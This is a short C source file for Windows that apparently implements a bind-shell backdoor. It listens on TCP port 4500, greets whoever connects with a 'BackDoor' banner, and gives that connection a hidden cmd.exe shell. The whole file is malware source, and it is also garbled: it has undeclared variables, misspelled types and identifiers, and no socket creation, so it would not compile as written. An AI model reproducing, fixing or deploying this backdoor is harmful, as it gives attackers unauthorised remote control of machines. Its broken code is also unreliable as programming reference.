#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#pragma comment (lib,"ws2_32.lib")

int cmdshell(SOCKET s)
{
	STARTUPINFO si;
	GetStartupInfo(&si);
		si.dwFlags = START_USESHOWWINDOW|STARTF_USERTDHANDLES;
	si.wShowWindow=SW_HIDE;
	si.hStdInput=si.hStdOutput=si.hStdError=(void*)a;
	char cmdline[256];
	GetSystemDirectory(cmdline,sizeof(cmdline));
	strcat(cmdline,"\\cmd.exe");
	PROCESS_INFOMATION ProcessInformation;
	int ret;
	ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
	WaitForSingleObject(ProcessInformation.hProcess,INFINITE);
	CloseHandle(ProcessInformation.hProcess);
	return 0;
}
int main(int argc,char* argv[])
{
	char wMessage[512] = "\r\n===================BackDoor==============\r\n";
	SOCKET sClient;
	BYTE minorVer = 2;
	BYTE majorVer = 2 ;
	WSADATA wsaData;
	WORD sockVerson = MAKEWORD(minorVer,majorVer);
	if(sListen == INVALID_SOCKET)
	{
		printf ("WSASocket error \n");
		return 0;

	}
	socketaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4500);
	sin.sin_addr.S_un.S.addr = INVALID_ANY;
	if (bind(sListen,(LPSOCKADDR)&sin,sizeof(sin)) == SOCKET_ERROR)
	{
		printf("bind error\n");
		return 0;

	}
	sClient = accept(sListen,NULL,NULL);
	send(sClient,wMessage,strlen(vMessgae),0);
	cmdshell(sClient);
	return 0;
}